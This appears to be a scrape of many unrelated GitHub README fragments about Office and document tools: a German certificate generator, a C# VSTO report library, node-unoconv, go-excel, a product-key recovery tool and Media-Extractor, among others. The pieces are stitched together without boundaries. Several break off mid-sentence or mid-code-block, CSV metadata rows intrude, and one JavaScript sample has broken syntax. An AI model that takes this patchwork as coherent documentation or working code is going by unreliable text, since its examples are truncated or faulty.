   - Danach sind die importierten Daten in der Tabelle zu sehen.
   - Allerdings werden die Daten transponiert dargestellt (In Excel horizontal, hier vertikal)

3. (3) ""Ausgabe Ordner"" wählen
   - Dieser sollte leer sein
   - Es wird zusätzlich ein Unterordner ""\_PDF\_"" angelegt
4. Button ""PDF"" kann vorerst ignoriert werden
5. Nachdem in Schritt 3 der ""Ausgabe Ordner"" gewählt wurde, aktivieren sich alle nötigen Buttons auf der rechten Seite.

## Zeugnisse erzeugen

### Dokumente für alle Einträge erzeugen

#### Die beste Reihenfolge für den Anfang

<b> - Voraussetzung: Alle nötigen Dokumente und die Ausgabe Ordner wurden ausgewählt.</b>

1. (5) ""Alle Zeilen: -> Word""
   - Konvertiert alle Daten aus der Excel-Quelle, für jeden  
   - Das Konvertieren dauert ein bisschen, ist aber immer noch deutlich schneller als zu Fuß.  
2. Kontrollieren, ob die Dokumente OK sind
   - Achtung! Beim Erzeugen der Word Zeugnisse:
     - Word nicht separat öffnen oder darin arbeiten, damit keine Fehler auftreten
3. (7) ""Alle Worddokumente: -> PDF""
   - Speichert alle Word Dokumente aus dem ""Ausgabe Ordner"", neu als PDF im zugehörigen \_PDF\_-Ordner ab 
4. ""kombiniere alle PDFs"" 
   - im Ordner \_PDF\_ die Datein Output.pdf drucken, diese enthält alle Zeugnisse in einem Dokument.
   
In der aktuellen Version wirkt das 

### Einzelne Dokumente erzeugen  

<b> - Voraussetzung: Alle nötigen Dokumente und die Ausgabe Ordner wurden ausgewählt.</b>

1. Irgendwo in die Zeile des gewünschten Datensatzes klicken
2. ""Ausgewählte Zeile: -> Word""
   - erzeugt für die selektierte Zeile ein neues *.Docx
3. ""Ausgewählte Zeile: -> Word und PDF"" 
   - Erzeugt wie in Schritt 2 das *.Docx und zusätzlich das passende *.PDF
4. Mit ""Beliebiges Worddokument: -> PDF"" können einzelne Worddateien ausgewählt und in ein *.PDF konvertiert/abgespeichert werden. 
  

## Hinweise

 - !! Achte darauf, dass das Excel-Dokument zur Word-Zeugnis-Vorlage passt !!
   - Felder/Tags, die nur in der Word-Zeugnis-Vorlage vorhanden sind, werden auch ausgefüllt
   - Fehlen diese Felder/Tags im Excel-Namensmanager, so kann es zu unerwarteten Programmfehlern kommen.
   - Texte zu den Kompetenzen der Word-Zeugnis-Vorlage werden beibehalten und nicht durch die einträge des Excel-Dokuments überschrieben.
     - Sollten hier Unterschiede auftreten, müssen die beiden Vorlagen aneinander abgeglichen werden

 - Datum mit Uhrzeit in der Vorschau:
   - Datum mit Uhrzeit in der Vorschau ist kein Grund zur Sorge. 
     - ![](img/Datum_Uhrzeit.PNG ""Datum in der Vorschau"")
   - Das Datumsformat wird in der Word-Vorlage definiert, sollte die Zeugnisausgabe falsch sein, muss die Word-Vorlage korrigiert werden.
     - ![](img/Datum_Word_Format.PNG ""Datums-Feld in Word konfigurieren"")
   
 - Dieses Projekt funktioniert nur unter Windows & Office (Word & Excel) müssen installiert sein.

Package provides a large report generator using on word docs using VSTO and C#

# Objective

While there have been quite a number of libraries which claims to be able to generate word document report. However, many of these libraries failed when it came to generate a very large report, one that may contains hundreds of pages or even more. This library was created to enable report generation in word document in these circumstances.

# Langauage

C# 

# Install

The library was built using VS2015 Community Edition. You can clone and build the library then add the library to your references in a .NET project. Note that this library is based on VSTO and thus requires the availability of office 2007 for it to work. It also requires the following COM libraries to be available in the C# project's references

* Microsoft.Office.Core (Version: 2.4)
* Microsoft.Office.Interop.Excel (Version: 1.6)
* Microsoft.Office.Interop.Word (Version: 8.4)

This link below shows how to solve the COM error when uninstall vs 2007 and reinstall some other version of office and then reinstall vs 2007:

# Usage

Below is the C# sample code for creating a sample report:

```cs 
using LargeDocWriter;

ReportModel report = new ReportModel();
report.StartSection_H1(""Section One"");

report.AppendParagraph(""Hello this is some text"");

report.StartSection_H2(""Paragraph Illustration"");

report.AppendParagraph(""Hello this is second paragraph"");

report.AppendParagraph(""Hello this is third paragraph"");

//report.AppendFigure(""some_picture.jpg"", ""Some figure"", 500, 300);

report.StartSection_H2(""Table Illustration"");

report.AppendParagraph(""This section shows how to create table."");

DataTable table = new DataTable();
table.Columns.Add(""Column1"");
table.Columns.Add(""Column2"");

DataRow row = table.NewRow();
row[""Column1""] = 200;
row[""Column2""] = 500;
table.Rows.Add(row);

report.AppendTable(table, ""Some table"");

report.StartSection_H2(""Chart Illustration"");

report.AppendParagraph(""This section shows how to create charts."");

Dictionary<string, float> barData = new Dictionary<string, float>();
barData[""one""] = 200;
barData[""two""] = 500;
barData[""three""] = 300;

report.AppendBarChart(barData, ""Some sample data"", 500, 300);

report.AppendColumnChart(barData, ""Some column bar"", 500, 300);

report.AppendPieChart(barData, ""some pie chart"", 400, 400);

report.StartSection_H1(""Conclusion"");

report.AppendParagraph(""Some conclusion"");


ReportGeneratorWithVSTO generator = new ReportGeneratorWithVSTO(report);

string imageContentFolder = ""/tmp"";
generator.GenerateReport(""/tmp/hello.doc"", imageContentFolder);

## Quick Start

### Prerequisites

Download and install nodeJS v16+ from https://nodejs.org/.

### Installation

Open a terminal window and run:

```bash
npm i -g @yumdocs/yumdocs-cli
```

### Getting started

1) Create a Word document named `input.docx`, type `{{field}}` and save it in the project directory.

2) In the same project directory, create a file named `data.json`, and copy-paste:

```json
{
  ""field"": ""Anything you see fit""
}
```

3) Open a terminal window in the project directory and run `yumdocs input.docx data.json output.docx`.

4) `output.docx` has been generated and the `{{field}}` placeholder has been replaced with `Anything you see fit`.",0,0,1,0,office,"[automation, docx, docx-generator, docx-template, docxtemplater, excel, javascript, js, json, microsoft, node, office, openxml, powerpoint, pptx, template, template-engine, typescript, word, xlsx]",0

If we don't know the time of clocking in today, we can use this tool to calculate the time to clock out.

Everyday I go to work, and press button to turn on my computer. So I use this start time to calculate the time that I can clock out.

On Windows, we can easyily use the event of ID 12 to get the start time.

[Github Overview](https://github.com/rkapl123), [All repositories](https://github.com/rkapl123?tab=repositories)

## Quantlib fully annotated source documentation
As a frequent user of [Quantlib](http://quantlib.org), I found that I needed to read more than the official reference documentation provided on the official website.
So I decided to tweak the doxygen config to produce a fully annotated source documentation of quantlib including collaboration diagrams, call/caller diagrams and a working search box: [https://rkapl123.github.io/QLAnnotatedSource](https://rkapl123.github.io/QLAnnotatedSource)

## ORE and OreControl
I'm using the Opensource Risk Engine ([ORE](http://www.opensourcerisk.org), based on Quantlib), my intention is to provide Tools for easier interaction with/integration of the Opensource Risk Engine. Following three goals are envisaged:

- [ ]  easy starting from Excel (OreAddin),
- [x]  loading and migrating ORE data from/to a Database (OreDB)
- [ ]  a Service wrapper (OreMgr) and a Database (OreDB) to run an ORE-Server.

All this will be available here: [OreControl]( https://rkapl123.github.io/OreControl/)

Following Article summarizes the [Enhancement of ORE with new instruments](Enhancing_ORE.md).

Also, a fully annotated source documentation of ORE's three libraries is available here: [https://rkapl123.github.io/OREAnnotatedSource](https://rkapl123.github.io/OREAnnotatedSource)

## DBAddin
DBAddin is an ExcelDNA-based Addin, providing two main functionalities and a definition Tool:

- Userdefined functions (DBFuncs) for database querying. This is opposed to the integrated MS-Query, which is stored statically in the worksheet and has serious limitations in terms of querying possibilities and constructing parameterized queries (MS-Query allows parameterized queries only for simple queries that can be displayed graphically). Further useful functions for working with database data are included as well.
- Modify Database data in Excel using so called ""DBModifiers"", which are either datatables that enable you to manipulate database data directly inside Excel (DBMappers, similar to MS Access table view). Another method are DBActions, allowing DML code to be issued (insert/update/delete) and finally DBSequences that put DBMappers and DBActions together, additionally allowing refreshing of DB functions and defining a transactional context (Begin and Commit/Rollback).
- As a useful ""leftover"" of the old DBSheets (DBSheets definitions are now used for DBMappers, additionally defining foreign key lookup resolutions for foreign keys, so columns containing foreign IDs can be edited more easily), legacy DBSheet definitions can be edited/created with the ""Create DBSheet definition"" tool and afterwards assigned to Worksheets with the ""Assign DBSheet definition"" tool.

Documentation: [https://rkapl123.github.io/DBAddin/](https://rkapl123.github.io/DBAddin/)  
Slideshow: [https://rkapl123.github.io/dbaddinslides/](https://rkapl123.github.io/dbaddinslides/)

## ScriptAddin
ScriptAddin is a simple ExcelDNA-based Add-in for handling scripts (R, Python, Perl, whatever you configure) from Excel, storing input objects (scalars/vectors/matrices)
and retrieving result objects (scalars/vectors/matrices) as text files (currently restricted to tab separated).
Graphics are retrieved from produced png files into Excel to be displayed as diagrams.  
This is an extension and replacement for the now obsolete RAddin.  
Documentation: [https://rkapl123.github.io/ScriptAddin](https://rkapl123.github.io/ScriptAddin)

## ExchangeSetOOF
ExchangeSetOOF provides programmatic setting of automatic replies (out of office) in an exchange environment, based on calendar appointments having an ""away"" status.

ExchangeSetOOF logs in to the currently logged in users account (using EWS AutoDiscover with users account Emailaddress using System.DirectoryServices.AccountManagement) and searches the appointments between today and the next business day (based on configured holidays) for appointments being set ""away"".

If any such appointment is found, ExchangeSetOOF replaces the template's date placeholder with the respective end date and (if wanted) also start date. The languages used for the replacement of the date placeholders are configurable (hardcoded are german and english). The automatic reply (out of office) is being scheduled to start from the Start Date of the OOF appointment and end on the End Date of the OOF appointment.

Documentation and download available here: [https://rkapl123.github.io/ExchangeSetOOF](https://rkapl123.github.io/ExchangeSetOOF)

## DatePicker

After struggling to find a replacement for the MSCOMCT2 based Datepicker, I finally decided to wrap the .NET MonthCalendar into a nice and small Add-In that offers this functionality to VBA: [https://github.com/rkapl123/DatePicker](https://github.com/rkapl123/DatePicker)  
It can also be used directly from the Ribbon to insert date values into cells.

## CmdLogAddin
ExcelDNA-based Addin that allows you to parse Excel's Cmdline and start any Macro that is contained either inside the started Workbook, a startup loaded Addin or outside.  

Additionally, a logging possibility is provided by retrieving a logger object in VBA (set log = CreateObject(""LogAddin.Logger"")) and using this to
provide logging messages using 5 levels:  

- log.Fatal (like log.Error but quits Excel)
- log.Error (also can send Mails, if desired)
- log.Warn
- log.Info
- log.Debug

Documentation and download available here: [https://rkapl123.github.io/CmdLogAddin](https://rkapl123.github.io/CmdLogAddin)

## Scouts administration helper

As a member of a local scouting group and being responsible for the member registration/administration, I've created a few tools to produce invoice- and other mailings to the members as well as registering/updating member information from our WordPress Form based pages. This however only works in conjunction with the registration tool iGrins from the Scouts of Lower Austria: [https://www.noe-pfadfinder.at/igrins](https://www.noe-pfadfinder.at/igrins)  

If you still think this is useful, read the documentation: [https://rkapl123.github.io/PfadfinderSchreiben](https://rkapl123.github.io/PfadfinderSchreiben)

## Some History
After more than 30 years, I decided to revitalize some of my first projects to contribute to the IT-Nostalgia. The story and its results can be found here, in [History](History.md).

## Useful Tips/Tools from other people
Following are links to pages with useful information or tools I've found during my endeavors:

### Creating Excel Add-Ins with Excel-DNA
For creating Excel Addins/Solutions, this is a tool/library you simply can't bypass: [http://excel-dna.net/](http://excel-dna.net/)
It's very easy to start for all that have some experience in VBA-Programming and - for an open source library - it has a lot of [documentation](https://docs.excel-dna.net/).

### Parsing Excel Data in Perl with Data-XLSX-Parser
A really nice, fast and memory efficient parser for new-format Excel (xlsx) files by Daisuke Murase (original author)/Masatoshi Kawazoe (active maintainer, [CPAN-Module](https://metacpan.org/pod/Data::XLSX::Parser)).

### Log-viewing with LogJoint
After quite a lot of searching, I finally found a very helpful log viewer that displays multiple logs (also rotated historic logs) side-by-side with a nice overview by thread, filtering and lots of other features: [LogJoint](https://github.com/sergey-su/logjoint).
Can be used for all kinds of logs, if your type is not built in, then simply roll your own format using regular expressions.

### SQL Server XML Queries
With examples from the ORE DB project: [SQLServerXML](SQLServerXML.md)


### A nice VB script to get the title of the current desktop wallpaper

As I'm a fond user of beautiful landscape wallpapers and also like to know the location of these pictures, I always try to store the information in the title of these pictures.
From [what I've seen](https://techdows.com/2016/01/where-windows-10-themes-photos-were-taken.html) this is also done for several Windows 10 desktop themes.

Now, if there is a wallpaper displayed that I'm not really familiar with, I wanted a quick way get to this info. 
Following script, derived from raveren's [https://gist.github.com/raveren/ab475336cc69879a378b](https://gist.github.com/raveren/ab475336cc69879a378b) does this job quite properly, if there are no unicode characters in the path.
Put it in a vbs file on the desktop or anywhere easily reachable and click it whenever you need this information!


```vb
Set Shell = CreateObject(""WScript.Shell"")

' change to TranscodedImageCache_001 for second monitor and so on
getTitleOfWallpaper(""HKCU\Control Panel\Desktop\TranscodedImageCache_000"")

Function getTitleOfWallpaper(regKey)
  ' decode the filename in the given registry storage
  arr = Shell.RegRead(regKey)
  a=arr
  fullPath = """"
  consequtiveZeroes = 0

  For I = 24 To Ubound(arr)
    if consequtiveZeroes > 1 then
      exit for
    end if

    a(I) = Cint(arr(I))

    if a(I) > 1 then
      fullPath = fullPath & Chr(a(I))
      consequtiveZeroes = 0
    else
      consequtiveZeroes = consequtiveZeroes + 1
    end if
  Next
  
  ' read the picture file from there
  TotalFile = readBinary(fullPath)
  
  ' grab the title from the file's meta information
  Dim oRe, oMatches
  Set oRe = New RegExp
  oRe.Pattern = ""<dc:title><rdf:Alt .*?><rdf:li .*?>(.*?)</rdf:li></rdf:Alt>""
  Set oMatches = oRe.Execute(TotalFile)
  On Error Resume Next
  MsgBox(oMatches(0).SubMatches(0))
  if Err<>0 then MsgBox ""No Title property found in current Wallpaper image !""
End Function

Function readBinary(strPath)
    Dim oFSO: Set oFSO = CreateObject(""Scripting.FileSystemObject"")
    Dim oFile: Set oFile = oFSO.GetFile(strPath)
    If IsNull(oFile) Then MsgBox(""File not found: "" & strPath) : Exit Function
    With oFile.OpenAsTextStream()
        readBinary = .Read(oFile.Size)
        .Close
    End With
End Function
```

### Face-IDs for Office Versions >= 2010
Following Code was adapted from John D. Mclean's code for Excel <= 2003 and displays all Face-IDs available for commandbar buttons in the Add-Ins ribbon (this is a long list, change the 4891 (max. number for Office 2010) to your office version):

```vb
Option Explicit
Sub DisplayButtonFacesInGrid()
Const cbName = ""FaceId""
Dim cBar As CommandBar, cBut As CommandBarControl
Dim r As Long, c As Integer, count As Integer

  count = 0
  Do                          'loop through all FaceIDs
    If count Mod 100 = 0 Then
        On Error Resume Next
        Application.CommandBars(count \ 100 & cbName).Delete
        On Error GoTo 0
        Set cBar = Application.CommandBars.Add    'create temporary ToolBar with one button
        With cBar
          .Name = count \ 100 & cbName
          .Top = count \ 100
          .Left = 0
          .Visible = True
          .RowIndex = count \ 100
        End With
    End If

    Set cBut = Application.CommandBars(count \ 100 & cbName).Controls.Add(Type:=msoControlButton)
    cBut.FaceId = count
    cBut.Caption = count
    count = count + 1
    Application.StatusBar = ""Creating Button FaceIDs "" & count
  Loop While count < 4891 '4890 seems to be the maximum FaceID #
  Application.StatusBar = """"
End Sub

' to get rid of all the command bars added to the Add-Ins ribbon, run the following procedure
Sub RemoveAddedCommandBars()
Const cbName = ""FaceId""
Dim count As Integer

  count = 0
  Do                          'loop through all FaceIDs
    If count Mod 100 = 0 Then
        On Error Resume Next
        Application.CommandBars(count \ 100 & cbName).Delete
        On Error GoTo 0
    End If
    count = count + 1
  Loop While count < 4891 '4890 seems to be the maximum FaceID #
End Sub
```

### executing VB.NET dynamically

Using below method you can execute dynamically provided code, in order to execute C-Sharp code, replace ""VisualBasic"" with ""CSharp"" in the `Dim codeProvider As CodeDomProvider = CodeDomProvider.CreateProvider(""VisualBasic"")` assignmenent.

```vb
Imports Microsoft.VisualBasic
Imports System.CodeDom
Imports System.CodeDom.Compiler

        Dim script As String = ""Public Class DummyClass"" + vbCrLf +
        ""Public Shared Function DoSomething(paramString As String) As String"" + vbCrLf +
        ""Return """"Hello World, you provided: """" + paramString "" + vbCrLf +
        ""End Function"" + vbCrLf +
        ""End Class""
        MsgBox(ExecuteScript(script))
    End Sub

    Public Function ExecuteScript(ByVal scripttext As String) As String
        Dim codeProvider As CodeDomProvider = CodeDomProvider.CreateProvider(""VisualBasic"")
        Dim params As New CompilerParameters With {
            .GenerateExecutable = False,
            .GenerateInMemory = True,
            .IncludeDebugInformation = False,
            .TreatWarningsAsErrors = False
        }
        ' add any required assemblies needed by the dynamic code here:
        'params.ReferencedAssemblies.Add(""system.dll"")
        'params.ReferencedAssemblies.Add(""System.Windows.Forms.dll"")
        Dim results As CompilerResults = codeProvider.CompileAssemblyFromSource(params, scripttext)

## 📦 Installation

### ⚙️ Required dependencies

The node-unoconv package requires [unoconv](https://github.com/unoconv/unoconv) and its dependencies to be installed. 

#### Installing LibreOffice or OpenOffice software

Office software is required to run [unoconv](https://github.com/unoconv/unoconv). LibreOffice is recommended but OpenOffice is still supported.

- ##### LibreOffice installation

  Please see official installation instructions on the LibreOffice website.  
  https://www.libreoffice.org/get-help/install-howto/

  Use command below to install LibreOffice inside Docker container:
  ```
  RUN apt-get -y install libreoffice
  ```
  
- ##### OpenOffice installation

  Please see official installation instructions on the OpenOffice website.  
  https://www.openoffice.org/download/common/instructions.html

### ⚙️ Installing node-unoconv package

After you install required dependencies, the node-unoconv package can be installed using commands below:
```bash
npm install node-unoconv

# or using yarn

yarn add node-unoconv
```

## 📃 Usage

There are few ways to import node-unoconv package to your NodeJS project:

#### ES6
```js
// ES6 import
import unoconv from 'node-unoconv';

unoconv.convert(input, options?); // Converting a file
unoconv.listen(options?); // Starting a conversion listener
```
```js
// Using named exports
import { convert, listen } from 'node-unoconv';

convert(input, options?); // Converting a file
listen(options?); // Starting a conversion listener
```

#### Require
```js
// Using Require
const unoconv = require('node-unoconv');

unoconv.convert(input, options?); // Converting a file
unoconv.listen(options?); // Starting a conversion listener
```
```js
// Alternative way to require convert or listen methods
const { convert, listen } = require('node-unoconv');

convert(input, options?); // Converting a file
listen(options?); // Starting a conversion listener
```

### Converting files

Converts an input file to a format specified in options object (defaults to pdf). By default, a promise is returned that resolves with a buffer or rejects with an error message. A callback function is also supported.  
  
```javascript
// Convert a file using a promise
unoconv.convert('file.doc')
  .then((buffer) => {
    console.log(buffer.length);
  }.catch((err) => {
    console.error(err);
  });
  
// or with async/await

const buffer = await unoconv.convert('file.doc');
```

Conversion with an output path and a callback
```javascript
const callback = (path, error) => {
  if (error) {
    console.error('Error', error);
    return;
  }
  
  console.log('Path:', path);
};

const options = {
  callback,
  output: 'file.pdf'
};
unoconv.convert(path);
```

### Starting a listener

Starts a standalone LibreOffice or OpenOffice listener.  
If **server** or **port** options are not specified, it uses defaults values *127.0.0.1* and *2002*.

```javascript
unoconv.listen();
```  

#### Starting a listener on a different address and port
```javascript
const options = {
  port: 2003,
  server: '127.0.0.1'
};

unoconv.listen(options);
```

## 🛠 Options

| Option                     | Type     | Default     | Description |
| -------------------------- | -------- | ----------- | ----------- |
| **connection**             | string   |             | UNO connection string to be used by the client to connect to an LibreOffice instance, or used by the listener to make LibreOffice listen.
| **output**                 | string   | `file.pdf`  | Output basename, filename or directory.
| **doctype**                | string   | `document`  | Specify the LibreOffice document type of the backend format. Possible document types are: document, graphics, presentation, spreadsheet.
| **password**               | string   |             | Provide a password to decrypt the document.
| **server**                 | string   | `127.0.0.1` | Server (address) to listen on (as listener) or to connect to (as client).
| **port**                   | number   | `2002`      | Port to listen on (as listener) or to connect to (as client).
| **pipe**                   |          |             | Use a pipe as an alternative connection mechanism to talk to LibreOffice.
| **export**                 | string[] |             | Set specific export filter options (related to the used LibreOffice filter).
| **field**                  | string[] |             | Replace user-defined text field with value.
| **format**                 | string   | `pdf`       | Specify the output format for the document. You can get a list of possible output formats per document type by using the --show option. Default document type is 'pdf'.
| **import**                 | string   | `utf-8`     | Set specific import filters options (related to the used LibreOffice import filter based on the input filename).
| **inputFilterName**        | string   | `xml`       | Set input filter name, useful when converting stdin or files without an extension.
| **listener**               | bool     | `false`     | Start unoconv as listener for unoconv clients to connect to. It's recommended to start the listener with `listen()` method.
| **disableHtmlUpdateLinks** | bool     | `false`     | Disables the recheck for updating links missed by libreoffice
| **noLaunch**               | bool     | `false`     | By default if no listener is running, unoconv will launch its own (temporary) listener to make sure the conversion works. This option will abort the conversion if no listener is found, rather than starting our own listener.
| **preserve**               | bool     | `false`     | Keep timestamp and permissions of the original document.
| **printer**                | string[] |             | Printer options<br/> - PaperFormat: specify printer paper format, eg. `PaperFormat=A3`<br/>- PaperOrientation: specify printer paper orientation, eg. `PaperOrientation=landscape`<br/>- PapserSize: specify printer paper size, paper format should set to USER, size=widthxheight, e.g. eg. `PaperSize=130x200` means width=130, height=200

### Multiple option values

Multiple values can be passed to an option as an array or as an object literal. See the example below, both ways result in the same command arguments passed to unoconv.
```javascript
const options = {
  printer: ['PaperFormat=A3', 'PaperOrientation=landscape'],
};

// or

const options = {
  printer: {
    PaperFormat: 'A3',
    PaperOrientation: 'landscape',
  },
};
```

### Example options
```javascript
const options = {
  connection: 'socket,host=localhost,port=2002;urp;StarOffice.ComponentContext',
  output: 'PDF',
  doctype: 'document',
  password: 'Abc123!@#',
  server: '127.0.0.1',
  port: 2002,
  export: { PageRange: '1-2' },
  field: { foo: 'bar' },
  format: 'PDF',
  import: { Quality: 50 },
  inputFilterName: 'odt',
  disableHtmlUpdateLinks: false,
  noLaunch: true,
  preserve: true,
  printer: ['PaperFormat=A3', 'PaperOrientation=landscape'],
}

This application can recovery keys from Windows, Office, and a few other products made by Microsoft that store their keys in the same way. Please only use the tool where you are allowed to. I originally created this tool so that I didn't have to trust the ones I found on the Internet. The design is starting to see its age since it was modeled around XP's registration window. This is my latest version of the tool, which now automatically detects new product editions without having to hardcode the support manually. There is still some work to be done before it becomes an official 2.0, so for now, consider it a working beta.

* **Artboard Dimensions:** 34"" x 15.0433""
* **Color Mode:** CMYK color
* **Color Profile:** U.S. Web Coated (SWOP) v2
* **Fonts:** [Droid Sans Mono (TrueType)](https://www.google.com/fonts/specimen/Droid+Sans+Mono)

I recommend printing at FedEx Office; send [`undated-calendar.pdf`](https://github.com/mhulse/undated-calendar/raw/master/undated-calendar.pdf) to <printandgo@fedex.com> and give “Retrieval Code” to a FedEx representative. From there, have them do a plotter print and ask for it to be trimmed and laminated. The completed calendar should run you about $15.

Use [1"" x 3"" Post-it Page Markers](http://amzn.com/B003IJW6IY) and/or [Expo Vis-A-Vis Wet-Erase Overhead Transparency Markers](http://amzn.com/B00006IFGW). Finally, use [Blu-Tack Reusable Adhesive](http://amzn.com/B001FGLX72) to affix the laminated calendar to your wall.

## About
**go-excel** it's a simple golang library for quickly creating beautiful Excel tables. The library is based on <a href=""https://github.com/qax-os/excelize"">excelize</a>. Supports reading and writing spreadsheet documents generated by Microsoft Excel™ 2007 and later.


## Usage

### Installation

```
$ go get github.com/I0HuKc/go-excel
```

Then import the library into your `go` file:

```go
import (
    excel ""github.com/I0HuKc/go-excel""
)
```

### Brief examples

To create a table, you need a table header object and an array of data that you want to write to the table. That's all you need to create a beautiful table quickly!

*You can find more detailed examples in the folder **<a href=""https://github.com/I0HuKc/go-excel/tree/main/examples"">examples</a>**.*

**Header params**

```go
// The row line from which the table will begin
var tableStartFromLine = 1

// Column names
var headValues = []string{""ID"", ""Name"", ""Username"", ""Email"", ""Phone"", ""Password"", ""City"", ""Zipcode""}

// Header parameters
var tableHeader excel.Header = excel.Header{
	CellParams: excel.CreateHeaderCell(headValues, strconv.Itoa(tableStartFromLine)),
	ColParams: []excel.ColWidth{
		{
			StartCol: ""A"",
			EndCol:   ""A"",
			Width:    10, // column width
		},
		{
			StartCol: ""B"",
			EndCol:   ""F"",
			Width:    30,
		},
		{
			StartCol: ""G"",
			EndCol:   ""H"",
			Width:    25,
		},
	},
	RowParams: []excel.RowHeight{
		{
			Row:    tableStartFromLine,
			Height: 25,
		},
	},
}
```

**Create data array**

The example uses test data structures, you can use data of any types and structures.

```go
	var tableValue [][]interface{}
	for _, v := range *data {
		tableValue = append(tableValue, []interface{}{
			v.Id,
			fmt.Sprintf(""%s %s"", v.Name.Firstname, v.Name.LastName),
			v.Username,
			v.Email,
			v.Phone,
			v.Password,
			v.Address.City,
			v.Address.Zipcode,
		})
	}
```

**Create XLSX file**

```go
excel.NewFile(""users.xlsx"")
```


**Create default table**

To create a table, you need to call only one method.

```go
excel.CreateDefaultTable(excel.DefaultTable{
		PathName:         ""users.xlsx"",
		TableHeader:      tableHeader,
		Data:             tableValue, // Data array written to the table
		Sheet:            ""Users"", // Sheet name
		ContentRowHeight: 18,
		ContentLineStart: tableStartFromLine + 1,
	});
```

Done!

微软 office 2010+ 文档压缩工具，这终究是个失败的工具，NConvert工具对图片的压缩比远没达到预料的比例，先记录留档，如果有好的图片压缩工具会重新调整。

程序的原理很简单，docx/xlsx/pptx 文件本质上都是压缩包，将文件解压缩后，对文档的图片进行压缩处理后重新打包成相对应的文档。

# 快速开始

### 依赖

+ python >= 3.6
+ NConvert

进入项目目录，使用以下命令安装依赖库

```
pip3 install -r requirements.txt
```

访问 https://www.xnview.com/en/nconvert/ 下载符合自己操作系统的 NConvert 程序

### 使用说明

暂时没有开发命令行

如果需要自定义，修改 `main.py` 文件中的 `FILES_PATH`（文档目录） 和 `COMPR_LEVL`（压缩级别） 即可，不自定义也可以使用默认配置，将文档放到程序根目录让程序自己搜索即可

使用 `$ python3 main.py` 即可运行程序

rabanti-github,Media-Extractor,,https://github.com/rabanti-github/Media-Extractor,https://api.github.com/repos/Media-Extractor/rabanti-github,"Media Extractor is an application to preview and extract packed media in Microsoft Office files (e.g. Word, PowerPoint or Excel documents) or common archives (e.g. zip, 7z or tar)","# ![Favicon](./resources/img/icon32.png) Media-Extractor

[![license: MIT](https://img.shields.io/github/license/rabanti-github/media-extractor.svg)](https://opensource.org/licenses/MIT)
[![GitHub Releases](https://img.shields.io/github/downloads/rabanti-github/media-extractor/latest/total.svg)](https://github.com/rabanti-github/Media-Extractor/releases/latest)
[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2Frabanti-github%2FMedia-Extractor.svg?type=shield)](https://app.fossa.io/projects/git%2Bgithub.com%2Frabanti-github%2FMedia-Extractor?ref=badge_shield)

Media-Extractor is an application to preview and extract packed media in Microsoft Office files (e.g. Word, PowerPoint or Excel documents), as well as in common archive files (e.g. zip, 7z, tar). Media-Extractor was written in C# and uses the 7zip library as archive processor, as well as WPF as GUI framework.

## Download

The most recent version of Media-Extractor can be downloaded on the [Page of the latest Release](https://github.com/rabanti-github/Media-Extractor/releases/latest).

- Usually, the **Installer** is suitable for the most users (e.g. **Media-Extractor-Setup_1_8.exe**).
- If you want to use Media-Extractor as a **portable app**, the release version is the right choice (e.g. '**Media-Extractor_Release_v1.8.zip**').
- The portable debug version (Debug.zip), as well as the source code (zip / tar.gz), is only necessary for development purpose.

Please see also the section [SmartScreen Warning in Windows 8.1, 10 and 11](#smartscreen-warning-in-windows-81-10-and-11)

## Feature Overview

- Supports most of the new Office formats (e.g. docx, xlsx, pptx)
- Supports a variety of archive formats (e.g. zip, tar, 7z)
- Creates previews of the most commonly used image formats used in Office (e.g. png, jpg, emf) which can be embedded
- Creates previews of embedded text and XML files
- Option to preview unknown, embedded files as plain text
- Supports export of all embedded files at once, selected ones or particular ones
- Supports export of other embedded data (e.g. xml files in xlsx or docx)
- Loading of files by menu, button, drag&drop or 'open with' (Windows Explorer)
- Dark mode
- Translations (see section [Translations](#Translations))

---

### Loading Documents

Documents (e.g. Excel worksheets, Word documents or zip archives) can be opened in several ways:

Use either the file menu or the 'Open Document' button to quickly load a document or archive.

![Open by Button](./resources/img/button_open.gif)

Drag a document or archive from the Windows Explorer into the drop area of the application (dashed box 'Drop Document here').

![Open by Drag into Area](./resources/img/drag_open.gif)

If Media-Extractor is not open yet, a document or archive can simply be dragged into the executable (MediaExtractor.exe).

![Open by Drag into App](./resources/img/drag_app_open.gif)

Last but not least, a document or archive can be opened over the Windows Explorer, using the context menu entry ""Open with..."". If performed once, Media-Extractor will be available as possible application to open a document or archive. This assignment must be done for each individual file extension (e.g. .docx, .xlsx, .zip).

![Open by Context Menu](./resources/img/context_open.gif)

### Appearance

Media-Extractor supports on the fly changing of the language (see section [Translations](#Translations)). However, the application will quickly reload. Previously loaded documents or archives must be opened again if the language is changed.

![Change the Language](./resources/img/change_locale.gif)

Media-Extractor supports Dark Mode. The mode can be changed on-the-fly, even if a document or archive is loaded. The mode, as well as other settings are remembered by Media-Extractor and restored if the application is restarted.

![Switch to Dark Mode](./resources/img/dark_mode.gif)

### Preview of embedded Files

By default, only previews of images are provided when loading a document or archive in Media-Extractor. However, all other files (e.g. XML, texts or config files) can be enabled for previews.

![Show all Files](./resources/img/show_all_files.gif)

There is also an option to display unknown file formats as texts. Nevertheless, the attempt to display binary files (e.g. exe, nested archives or movie clips) as text may still fail if there are non-printable characters.

![Preview unknown Formats](./resources/img/preview_unknown_formats.gif)

Furthermore, embedded files can be sorted based on their properties, like file name, size or extension.

Currently, four columns are available:

- Name of the embedded file
- Relative path of the embedded file in the document or archive
- File extension of the embedded file
- Size of the embedded file (extracted size)

![Preview unknown Formats](./resources/img/sort_files.gif)

### Saving of embedded Files

Saving of embedded files is independent of the previews. They can be saved, even if not possible to be displayed as preview. Embedded files can be saved in various ways:

If no file is selected in the list, all files are saved by default. The default of saving all or saving only selected files can be defined with the save button on the right side of the application.

![Save all Files](./resources/img/save_all_files.gif)

One or many files (using ctrl or shift key) can be selected in the list and extracted.

![Save selected Files](./resources/img/save_selected_files.gif)

---

## System Requirements

Although Media-Extractor provides an [installer](#Download), it does not need an installation and can be run as portable app. The [downloaded zip file](#Download) can be unzipped in a folder of your choice. The general system requirements are:

- Microsoft Windows 7, 8.1, 10, 11
- .NET 4.8 or higher installed

Please see the section about the [SmartScreen Warning](#smartscreen-warning-in-windows-81-10-and-11) if you have problem to run the application after downloading.

## Translations

Currently, Media-Extractor is translated to the following Languages:

| Language | Status    | Provided by        |
| -------- | --------- | ------------------ |
| **English**  | Completed | Application Author |
| **German**   | Completed | Application Author |
| **French**   | Completed | AI based translation |

